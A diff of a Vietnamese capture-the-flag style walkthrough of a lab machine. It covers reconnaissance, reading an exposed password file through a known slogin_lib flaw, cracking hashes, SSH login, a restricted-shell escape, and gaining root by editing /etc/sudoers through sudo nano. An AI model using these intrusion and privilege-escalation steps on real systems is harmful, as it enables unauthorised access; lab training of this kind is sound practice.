@@ -1,4 +1,4 @@
-# Recon
+## Recon
 
 ```
 nmap -sSCV 192.168.182.136
@@ -136,6 +136,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 98.82 seconds
 ```
 
+## Gain access
+
 Truy cập trang chủ tại 192.168.182.136:8080:
 
 ![img](img/home.png)
@@ -184,6 +186,115 @@ Phát hiện một file ẩn có tên `test.pcap` tại root directory. Tải fi
 
 ![img](img/pcap.png)
 
-Thấy một trang bí mật là `/developmentsecretpage/directortestpagev1.php`. Tiến hành mở trang này:
+Thấy một trang bí mật là `/developmentsecretpage/directortestpagev1.php`. Đi đến trang này:
 
 ![img](img/directortestpagev1.png)
+
+Tiến hành logout và đến được trang đăng nhập:
+
+![img](img/login.png)
+
+Thử các payload khai thác SQLi, trang đăng nhập báo lỗi ở thư viện `slogin_lib.inc`:
+
+```
+Deprecated: Function ereg_replace() is deprecated in /var/www/html/developmentsecretpage/slogin_lib.inc.php on line 335
+
+Deprecated: Function ereg_replace() is deprecated in /var/www/html/developmentsecretpage/slogin_lib.inc.php on line 336
+```
+
+Thử tìm kiếm thư viện này trên exploitdb, thu được https://www.exploit-db.com/exploits/7444.
+
+```
+In this login system, sensible datas like username and password are stored in a local
+text file , so we can get sensitive information just going to this txt file . The name of
+this file is set in slogin_lib.inc.php. By default is: slog_users.txt
+
+[!] EXPLOIT: /[path]/slog_users.txt
+```
+
+Thử truy cập đến trang 192.168.182.136:8080/developmentsecretpage/slog_users.txt, lấy được user và password đã bị hash:
+
+```
+admin, 3cb1d13bb83ffff2defe8d1443d3a0eb
+intern, 4a8a2b374f463b7aedbb44a066363b81
+patrick, 87e6d56ce79af90dbe07d387d3d0579e
+qiu, ee64497098d0926d198f54f6d5431f98
+```
+
+Do ta không biết password này được hash theo kiểu nào nên ta tiến hành dò tìm theo tất cả kiểu hash thông dụng, bài này sử dụng công cụ ở trang https://md5hashing.net/hash.
+
+![img](img/hash.png)
+
+Thu được kết quả:
+
+```
+intern, 12345678900987654321
+patrick, P@ssw0rd25
+```
+
+Dùng username và password này để ssh vào server:
+
+```
+┌──(root㉿kali)-[/home/kali]
+└─# ssh intern@192.168.182.136
+intern@192.168.182.136's password: 
+Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-200-generic x86_64)
+
+[...]
+
+Last login: Tue Dec 13 08:29:01 2022 from 192.168.182.135
+Congratulations! You tried harder!
+Welcome to Development!
+Type '?' or 'help' to get the list of allowed commands
+intern:~$ ?
+cd  clear  echo  exit  help  ll  lpath  ls
+```
+
+## Privilege Escalation
+
+Shell hiện tại khiến ta chỉ có thể thao tác một số lệnh với hệ thống. Spawn shell để thoải mái thao tác hơn https://ed4m4s.blog/spawning-a-shell: 
+
+```sh
+intern:~$ ?
+cd  clear  echo  exit  help  ll  lpath  ls
+intern:~$ echo os.system('/bin/bash') 
+intern@development:~$ whoami
+intern
+```
+
+Tìm kiếm cách để leo thang đặc quyền:
+
+
+```sh
+intern@development:~$ sudo -l
+[sudo] password for intern: 
+Sorry, user intern may not run sudo on development.
+```
+
+Thử chuyển sang user `patrick`:
+
+```sh
+intern@development:~$ su patrick
+Password: 
+patrick@development:/home/intern$ sudo -l
+Matching Defaults entries for patrick on development:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User patrick may run the following commands on development:
+    (ALL) NOPASSWD: /usr/bin/vim
+    (ALL) NOPASSWD: /bin/nano
+```
+
+User này có quyền sudo với trình soạn thảo văn bản nano và vim, tiến hành sửa file `etc/sudoers` để nâng lên quyền root bằng cách thêm dòng sau:
+
+```
+patrick ALL=(ALL:ALL) ALL
+```
+
+```sh
+patrick@development:/home/intern$ sudo nano /etc/sudoers
+patrick@development:/home/intern$ sudo su
+[sudo] password for patrick: 
+root@development:/home/intern# whoami
+root
+```
